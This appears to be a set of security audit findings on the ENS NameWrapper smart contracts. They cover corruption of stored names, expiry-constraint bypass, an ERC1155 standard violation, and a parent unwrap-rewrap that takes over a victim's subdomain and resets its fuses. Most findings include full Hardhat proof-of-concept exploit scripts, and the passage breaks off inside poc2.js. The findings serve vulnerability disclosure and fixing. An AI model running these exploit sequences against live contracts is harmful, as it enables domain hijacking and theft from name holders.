# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L520   # Vulnerability details  ### Description  By design, the `NameWrapper.names` is used as a preimage DB so that the client can query the domain name by providing the token ID. The name should be correctly stored. To do so, the `NameWrapper` record the domain's name every time it gets wrapped. And as long as all the parent nodes are recorded in the DB, wrapping a child node will be very efficient by simply querying the parent node's name.  However, within a malicious scenario, it is possible that a subdomain can be wrapped without recording its info in the preimage DB.  Specifically, when `NameWrappper.setSubnodeOwner` / `NameWrappper.setSubnodeRecord` on a given subdomain, the following code is used to check whether the subdomain is wrapped or not. The preimage DB is only updated when the subdomain is not wrapped (to save gas I beieve).  ```solidity= function setSubnodeOwner(     bytes32 parentNode,     string calldata label,     address newOwner,     uint32 fuses,     uint64 expiry )     public     onlyTokenOwner(parentNode)     canCallSetSubnodeOwner(parentNode, keccak256(bytes(label)))     returns (bytes32 node) {     bytes32 labelhash = keccak256(bytes(label));     node = _makeNode(parentNode, labelhash);     (, , expiry) = _getDataAndNormaliseExpiry(parentNode, node, expiry);     if (ens.owner(node) != address(this)) {         ens.setSubnodeOwner(parentNode, labelhash, address(this));         _addLabelAndWrap(parentNode, node, label, newOwner, fuses, expiry);     } else {         _transferAndBurnFuses(node, newOwner, fuses, expiry);     } } ```  However, the problem is that `ens.owner(node) != address(this)` is not sufficient to check whether the node is alreay wrapped. The hacker can manipulate this check by simply invoking `EnsRegistry.setSubnodeOwner` to set the owner as the `NameWrapper` contract without wrapping the node.  Consider the following attack scenario.  + the hacker registers a 2LD domain, e.g., `base.eth` + he assigns a subdomain for himself, e.g., `sub1.base.eth`      + the expiry of `sub1.base.eth` should be set as expired shortly      + note that the expiry is for `sub1.base.eth` instead of `base.eth`, so it is safe to make it soonly expired + the hacker waits for expiration and unwraps his `sub1.base.eth` + the hacker invokes `ens.setSubnodeOwner` to set the owner of `sub2.sub1.base.eth` as NameWrapper contract + the hacker re-wraps his `sub1.base.eth` + the hacker invokes `nameWrapper.setSubnodeOwner` for `sub2.sub1.base.eth`      + as such, `names[namehash(sub2.sub1.base.eth)]` becomes empty  + the hacker invokes `nameWrapper.setSubnodeOwner` for `eth.sub2.sub1.base.eth`.      + as such, `names[namehash(eth.sub2.sub1.base.eth)]` becomes `\x03eth`  It is not rated as a High issue since the forged name is not valid, i.e., without the tailed `\x00` (note that a valid name should be like `\x03eth\x00`). However, the preimage BD can still be corrupted due to this issue.  ### Notes  Discussed with the project member, Jeff Lau.   If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.   ### Suggested Fix  When wrapping node `X`, check whether `NameWrapper.names[X]` is empty directly, and update the preimage DB if it is empty.  ### PoC / Attack Scenario  There is a PoC file named `poc3.js`  To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.   #### poc3.js ```javascript= const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const provider = ethers.provider const namehash = n.hash const { evm } = require('../test-utils') const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 3', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('name of a subdomain can be forged', () => {     /*      * Attack scenario:      * 1. the hacker registers a 2LD domain, e.g., base.eth      *      * 2. he assigns a subdomain for himself, e.g., sub1.base.eth      *      + the expiry of sub1.base.eth should be set as expired shortly      *      + note that the expiry is for sub1.base.eth not base.eth, so it is safe to make it soonly expired      *      * 3. the hacker waits for expiration and unwraps his sub1.base.eth      *      * 4. the hacker invokes ens.setSubnodeOwner to set the owner of sub2.sub1.base.eth as NameWrapper contract      *      * 5. the hacker re-wraps his sub1.base.eth      *      * 6. the hacker invokes nameWrapper.setSubnodeOwner for sub2.sub1.base.eth      *      + as such, `names[namehash(sub2.sub1.base.eth)]` becomes empty      *      * 7. the hacker invokes nameWrapper.setSubnodeOwner for eht.sub2.sub1.base.eth.      *      + as such, `names[namehash(eth.sub2.sub1.base.eth)]` becomes \03eth      */     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'base'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // registers a 2LD domain       await NameWrapper.registerAndWrapETH2LD(         label,         hacker,         86400,         EMPTY_ADDRESS,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         MAX_EXPIRY       )       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)        // signed a submomain for the hacker, with a soon-expired expiry       const sub1Label = 'sub1'       const sub1LabelHash = labelhash(sub1Label)       const sub1Domain = sub1Label + '.' + label + '.eth'  // sub1.base.eth       const wrappedSub1TokenId = namehash(sub1Domain)       const block = await provider.getBlock(await provider.getBlockNumber())       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         sub1Label,         hacker,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         block.timestamp + 3600 // soonly expired       )       expect(await EnsRegistry.owner(wrappedSub1TokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSub1TokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSub1TokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL | CANNOT_UNWRAP)        // the hacker unwraps his wrappedSubTokenId       await evm.advanceTime(7200)       await NameWrapperH.unwrap(wrappedTokenId, sub1LabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSub1TokenId)).to.equal(hacker)        // the hacker setSubnodeOwner, to set the owner of wrappedSub2TokenId as NameWrapper       const sub2Label = 'sub2'       const sub2LabelHash = labelhash(sub2Label)       const sub2Domain = sub2Label + '.' + sub1Domain // sub2.sub1.base.eth       const wrappedSub2TokenId = namehash(sub2Domain)       await EnsRegistryH.setSubnodeOwner(           wrappedSub1TokenId,           sub2LabelHash,           NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedSub2TokenId)).to.equal(           NameWrapper.address       )        // the hacker re-wraps the sub1node       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)       await NameWrapperH.wrap(encodeName(sub1Domain), hacker, EMPTY_ADDRESS)       expect(await NameWrapper.ownerOf(wrappedSub1TokenId)).to.equal(hacker)        // the hackers setSubnodeOwner       // XXX: till now, the hacker gets sub2Domain with no name in Namewrapper       await NameWrapperH.setSubnodeOwner(         wrappedSub1TokenId,         sub2Label,         hacker,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         MAX_EXPIRY       )       expect(await NameWrapper.ownerOf(wrappedSub2TokenId)).to.equal(hacker)       expect(await NameWrapper.names(wrappedSub2TokenId)).to.equal('0x')        // the hacker forge a fake root node       const sub3Label = 'eth'       const sub3LabelHash = labelhash(sub3Label)       const sub3Domain = sub3Label + '.' + sub2Domain // eth.sub2.sub1.base.eth       const wrappedSub3TokenId = namehash(sub3Domain)       await NameWrapperH.setSubnodeOwner(         wrappedSub2TokenId,         sub3Label,         hacker,         PARENT_CANNOT_CONTROL | CANNOT_UNWRAP,         MAX_EXPIRY       )       expect(await NameWrapper.ownerOf(wrappedSub3TokenId)).to.equal(hacker)        // ///////////////////////////       // // Attack successed!       // ///////////////////////////        // XXX: names[wrappedSub3TokenId] becomes `\x03eth`       expect(await NameWrapper.names(wrappedSub3TokenId)).to.equal('0x03657468') // \03eth     })   }) }) ```  
# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L504 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L356   # Vulnerability details  ### Description  By design, the child node's expiry can only be extended up to the parent's current one. Adding these restrictions means that the ENS users only have to look at the name itself's fuses and expiry (without traversing the hierarchy) to understand what guarantees the users have.  When a parent node tries to `setSubnodeOwner` / `setSubnodeRecord`, the following code is used to guarantee that the new expiry can only be extended up to the current one.  ```solidity= function _getDataAndNormaliseExpiry(     bytes32 parentNode,     bytes32 node,     uint64 expiry )     internal     view     returns (         address owner,         uint32 fuses,         uint64     ) {     uint64 oldExpiry;     (owner, fuses, oldExpiry) = getData(uint256(node));     (, , uint64 maxExpiry) = getData(uint256(parentNode));     expiry = _normaliseExpiry(expiry, oldExpiry, maxExpiry);     return (owner, fuses, expiry); } ```  However, the problem shows when   + The sub-domain (e.g., `sub1.base.eth`) has its own sub-sub-domain (e.g., `sub2.sub1.base.eth`) + The sub-domain is unwrapped later, and thus its `oldExpiry` becomes zero. + When `base.eth` calls `NameWrapper.setSubnodeOwner`, there is not constraint of `sub1.base.eth`'s expiry, since `oldExpiry == 0`. As a result, the new expiry of `sub1.base.eth` can be arbitrary and smaller than the one of `sub2.sub1.base.eth`  The point here is that the `oldExpiry` will be set as 0 when unwrapping the node even it holds child nodes, relaxing the constraint.  Specifically, considering the following scenario  + The hacker owns a domain (or a 2LD), e.g., `base.eth` + The hacker assigns a sub-domain to himself, e.g., `sub1.base.eth`     + The expiry should be as large as possible + Hacker assigns a sub-sub-domain, e.g., `sub2.sub1.base.eth`     + The expiry should be as large as possible + The hacker unwraps his sub-domain, i.e., `sub1.base.eth` + The hacker re-wraps his sub-domain via `NameWrapper.setSubnodeOwner`     + The expiry can be small than the one of sub2.sub1.base.eth      The root cause _seems_ that we should not zero out the expiry when burning a node if the node holds any subnode.  ### Notes  Discussed with the project member, Jeff Lau.   If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.   ### Suggested Fix  + Potential fix 1: auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped. + Potential fix 2: force the parent to have `CANNOT_UNWRAP` burnt if they want to set expiries on a child via `setSubnodeOwner` / `setSubnodeRecord` / `setChildFuses`  ### PoC / Attack Scenario  There is a PoC file named `poc5.js`  To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.   #### poc5.js  ```javascript= const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const provider = ethers.provider const namehash = n.hash const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 5', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('subdomain can be re-wrapped', () => {     /*      * Attack scenario:      *  + The hacker owns a domain (or a 2LD), e.g., base.eth      *  + The hacker assigns a sub-domain to himself, e.g., sub1.base.eth      *      + The expiry should be as large as possible      *  + Hacker assigns a sub-sub-domain, e.g., sub2.sub1.base.eth      *      + The expiry should be as large as possible      *  + The hacker unwraps his sub-domain, i.e., sub1.base.eth      *  + The hacker re-wraps his sub-domain, i.e., sub1.base.eth      *      + The expiry can be small than the one of sub2.sub1.base.eth      */     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'base'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // register a 2LD domain       await NameWrapper.registerAndWrapETH2LD(         label,         hacker,         86400,         EMPTY_ADDRESS,         CAN_DO_EVERYTHING,         MAX_EXPIRY       )       const block = await provider.getBlock(await provider.getBlockNumber())       const expiry = block.timestamp + 86400       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedTokenId))[1]       ).to.equal(expiry)        // assign a submomain       const subLabel = 'sub1'       const subLabelHash = labelhash(subLabel)       const subDomain = subLabel + '.' + label + '.eth'       const wrappedSubTokenId = namehash(subDomain)       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         subLabel,         hacker,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSubTokenId))[1]       ).to.equal(expiry)        // assign a subsubmomain       const subSubLabel = 'sub2'       const subSubLabelHash = labelhash(subSubLabel)       const subSubDomain = subSubLabel + '.' + subDomain       const wrappedSubSubTokenId = namehash(subSubDomain)       await NameWrapperH.setSubnodeOwner(         wrappedSubTokenId,         subSubLabel,         hacker,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubSubTokenId)).to.equal(hacker)       expect(           (await NameWrapper.getFuses(wrappedSubSubTokenId))[1]       ).to.equal(expiry)        // the hacker unwraps his wrappedSubTokenId       await NameWrapperH.unwrap(wrappedTokenId, subLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)        // the hacker re-wrap his wrappedSubTokenId by NameWrapper.setSubnodeOwner       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         subLabel,         hacker,         PARENT_CANNOT_CONTROL,         expiry - 7200       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)        ///////////////////////////       // Attack successed!       ///////////////////////////        // XXX: the expiry of sub1.base.eth is smaller than the one of sub2.sub1.base.eth       const sub1_expiry = (await NameWrapper.getFuses(wrappedSubTokenId))[1]       const sub2_expiry = (await NameWrapper.getFuses(wrappedSubSubTokenId))[1]       console.log('sub1 expiry:', sub1_expiry)       console.log('sub2 expiry:', sub2_expiry)       expect(sub1_expiry.toNumber()).to.be.lessThan(sub2_expiry.toNumber())     })   }) }) ```  
# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/ERC1155Fuse.sol#L274-L284   # Vulnerability details  ## Impact  MED - the function of the protocol could be impacted  The `safeTransferFrom` does not comply with the ERC1155 standard when the token is sent to the old owner.  ## Proof of Concept  According to the EIP-1155 standard for the `safeTransferFrom`:  > MUST revert if balance of holder for token `_id` is lower than the `_value` sent.   Let's say `alice` does not hold any token of `tokenId`, and `bob` holds one token of `tokenId`. Then alice tries to send one token of `tokenId` to bob with `safeTranferFrom(alice, bob, tokenId, 1, "")`.  In this case, even though alice's balance (= 0) is lower than the amount (= 1) sent, the `safeTransferFrom` will not revert. Thus, violating the EIP-1155 standard. It can cause problems for other contracts using this token, since they assume the token was transferred if the `safeTransferFrom` does not revert. However, in the example above, no token was actually transferred.  ```solidity // https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/ERC1155Fuse.sol#L274-L284 // wrapper/ERC1155Fuse.sol::_transfer // ERC1155Fuse::safeTransferFrom uses _transfer  274     function _transfer( 275         address from, 276         address to, 277         uint256 id, 278         uint256 amount, 279         bytes memory data 280     ) internal { 281         (address oldOwner, uint32 fuses, uint64 expiry) = getData(id); 282         if (oldOwner == to) { 283             return; 284         } ```  ## Tools Used  none  ## Recommended Mitigation Steps  Revert even if the `to` address already owns the token.    
# Lines of code  https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L356 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/wrapper/NameWrapper.sol#L295 https://github.com/code-423n4/2022-07-ens/blob/ff6e59b9415d0ead7daf31c2ed06e86d9061ae22/contracts/registry/ENSRegistry.sol#L74   # Vulnerability details  ### Description  By design, for any subdomain, as long as its `PARENT_CANNOT_CONTROL` fuse is burnt (and does not expire), its parent should not be able to burn its fuses or change its owner.  However, this contraint can be bypassed by a parent node maliciously unwrapping itself. As long as the hacker becomes the ENS owner of the parent node, he can leverage `ENSRegistry::setSubnodeOwner` to re-set himself as the ENS owner of the subdomain, and thus re-invoking `NameWrapper.wrap` can rewrite the fuses and wrapper owner of the given subdoamin.   Considering the following attack scenario:  + Someone owns a domain (or a 2LD), e.g., _poc.eth_ + The domain owner assigns a sub-domain to the hacker, e.g., _hack.poc.eth_      + This sub-domain should not burn `CANNOT_UNWRAP`      + This sub-domain can burn `PARENT_CANNOT_CONTROL` + Hacker assigns a sub-sub-domain to a victim user, e.g., _victim.hack.poc.eth_ + The victim user burns arbitrary fuses, including `PARENT_CANNOT_CONTROL`      + The hacker should not be able to change the owner and the fuses of `victim.hack.poc.eth` ideally + However, the hacker then unwraps his sub-domain, i.e., _hack.poc.eth_ + The hacker invokes `ENSRegistry::setSubnodeOwner(hacker.poc.eth, victim)` on the sub-sub-domain      + He can reassign himself as the owner of the _victim.hack.poc.eth_ + The hacker invokes `NameWrapper.wrap(victim.hacker.poc.eth)` to over-write the fuses and owner of the sub-sub-domain, i.e., _victim.hacker.poc.eth_  The root cause here is that, for any node, when one of its subdomains burns `PARENT_CANNOT_CONTROL`, the node itself fails to burn `CANNOT_UNWRAP`. Theoretically, this should check to the root, which however is very gas-consuming.   ### Notes  Discussed with the project member, Jeff Lau.   If there is any issue running the attached PoC code, please contact me via `izhuer#0001` discord.   ### Suggested Fix  + Potential fix 1: auto-burn `CANNOT_UNWRAP` which thus lets `expiry` decide whether a node can be unwrapped. + Potential fix 2: leave fuses as is when unwrapping and re-wrapping, unless name expires. Meanwhile, check the old fuses even wrapping.   ### PoC / Attack Scenario  There are two attached PoC files, `poc1.js` and `poc2.js`. The `poc1.js` is for a case where the hacker holds a 2LD, and the `poc2.js` demonstrates the aforementioned scenario.  To run the PoC, put then in `2022-07-ens/test/wrapper` and run `npx hardhat test --grep 'PoC'`.   #### poc1.js ```javascript const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const namehash = n.hash const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 1', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('subdomain can be re-wrapped', () => {     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'register'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // register a 2LD domain for the hacker       await NameWrapper.registerAndWrapETH2LD(         label,         hacker,         86400,         EMPTY_ADDRESS,         CAN_DO_EVERYTHING,         MAX_EXPIRY       )       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(         NameWrapper.address       )       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(         NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedTokenId)).to.equal(hacker)        // hacker signed a submomain for a victim user       const subLabel = 'hack'       const subLabelHash = labelhash(subLabel)       const wrappedSubTokenId = namehash(subLabel + '.' + label + '.eth')       await NameWrapperH.setSubnodeOwner(         wrappedTokenId,         subLabel,         victim,         PARENT_CANNOT_CONTROL,         MAX_EXPIRY       )       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(           NameWrapper.address       )       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(victim)       expect(           (await NameWrapper.getFuses(wrappedSubTokenId))[0]       ).to.equal(PARENT_CANNOT_CONTROL)        // the user sets a very strict fuse for the wrappedSubTokenId       await NameWrapperV.setFuses(wrappedSubTokenId, 127 - PARENT_CANNOT_CONTROL) // 63       expect((await NameWrapper.getFuses(wrappedSubTokenId))[0]).to.equal(127)        // the hacker unwraps his 2LD token       await NameWrapperH.unwrapETH2LD(labelHash, hacker, hacker)       expect(await BaseRegistrar.ownerOf(labelHash)).to.equal(hacker)       expect(await EnsRegistry.owner(wrappedTokenId)).to.equal(hacker)        // the hacker setSubnodeOwner       await EnsRegistryH.setSubnodeOwner(wrappedTokenId, subLabelHash, hacker)       expect(await EnsRegistry.owner(wrappedSubTokenId)).to.equal(hacker)        // the hacker re-wrap the sub node       await EnsRegistryH.setApprovalForAll(NameWrapper.address, true)       await NameWrapperH.wrap(           encodeName(subLabel + '.' + label + '.eth'),           hacker,           EMPTY_ADDRESS       )        ///////////////////////////       // Attack successed!       ///////////////////////////        // XXX: [1] the owner of wrappedSubTokenId transfer from the victim to the hacker       // XXX: [2] the fuses of wrappedSubTokenId becomes 0 from full-protected       expect(await NameWrapper.ownerOf(wrappedSubTokenId)).to.equal(hacker)       expect((await NameWrapper.getFuses(wrappedSubTokenId))[0]).to.equal(0)     })   }) }) ```  #### poc2.js ```javascript const packet = require('dns-packet') const { ethers } = require('hardhat') const { utils } = ethers const { use, expect } = require('chai') const { solidity } = require('ethereum-waffle') const n = require('eth-ens-namehash') const namehash = n.hash const { deploy } = require('../test-utils/contracts') const { keccak256 } = require('ethers/lib/utils')  use(solidity)  const labelhash = (label) => utils.keccak256(utils.toUtf8Bytes(label)) const ROOT_NODE =   '0x0000000000000000000000000000000000000000000000000000000000000000'  const EMPTY_ADDRESS = '0x0000000000000000000000000000000000000000'  function encodeName(name) {   return '0x' + packet.name.encode(name).toString('hex') }  const CANNOT_UNWRAP = 1 const CANNOT_BURN_FUSES = 2 const CANNOT_TRANSFER = 4 const CANNOT_SET_RESOLVER = 8 const CANNOT_SET_TTL = 16 const CANNOT_CREATE_SUBDOMAIN = 32 const PARENT_CANNOT_CONTROL = 64 const CAN_DO_EVERYTHING = 0  describe('PoC 2', () => {   let ENSRegistry   let BaseRegistrar   let NameWrapper   let NameWrapperV   let MetaDataservice   let signers   let dev   let victim   let hacker   let result   let MAX_EXPIRY = 2n ** 64n - 1n    before(async () => {     signers = await ethers.getSigners()     dev = await signers[0].getAddress()     victim = await signers[1].getAddress()     hacker = await signers[2].getAddress()      EnsRegistry = await deploy('ENSRegistry')     EnsRegistryV = EnsRegistry.connect(signers[1])     EnsRegistryH = EnsRegistry.connect(signers[2])      BaseRegistrar = await deploy(       'BaseRegistrarImplementation',       EnsRegistry.address,       namehash('eth')     )      await BaseRegistrar.addController(dev)     await BaseRegistrar.addController(victim)      MetaDataservice = await deploy(       'StaticMetadataService',       'https://ens.domains'     )      NameWrapper = await deploy(       'NameWrapper',       EnsRegistry.address,       BaseRegistrar.address,       MetaDataservice.address     )     NameWrapperV = NameWrapper.connect(signers[1])     NameWrapperH = NameWrapper.connect(signers[2])      // setup .eth     await EnsRegistry.setSubnodeOwner(       ROOT_NODE,       labelhash('eth'),       BaseRegistrar.address     )      //make sure base registrar is owner of eth TLD     expect(await EnsRegistry.owner(namehash('eth'))).to.equal(       BaseRegistrar.address     )   })    beforeEach(async () => {     result = await ethers.provider.send('evm_snapshot')   })   afterEach(async () => {     await ethers.provider.send('evm_revert', [result])   })    describe('subdomain can be re-wrapped', () => {     /*      * Attack scenario:      *  + Someone owns a domain (or a 2LD), e.g., poc.eth      *  + The domain owner assigns a sub-domain to the hacker, e.g., hack.poc.eth      *      + This sub-domain should not burn `CANNOT_UNWRAP`      *      + This sub-domain can burn `PARENT_CANNOT_CONTROL`      *  + Hacker assigns a sub-sub-domain to a victim user, e.g., victim.hack.poc.eth      *  + The victim user burns arbitrary fuses, including `PARENT_CANNOT_CONTROL`      *  + The hacker unwraps his sub-domain, i.e., hack.poc.eth      *  + The hacker invokes `ENSRegistry::setSubnodeOwner` on the sub-sub-domain      *      + He can reassign himself as the owner of the victim.hack.poc.eth      *  + The sub-sub-domain is now owned by the hacker with more permissive fuses      */     before(async () => {       await BaseRegistrar.addController(NameWrapper.address)       await NameWrapper.setController(dev, true)     })      it('a passed test denotes a successful attack', async () => {       const label = 'poc'       const labelHash = labelhash(label)       const wrappedTokenId = namehash(label + '.eth')        // register a 2LD domain       await NameWrapper.registerAndWrapETH2LD(         label,         dev,         86400,         EMPTY_ADDRESS,         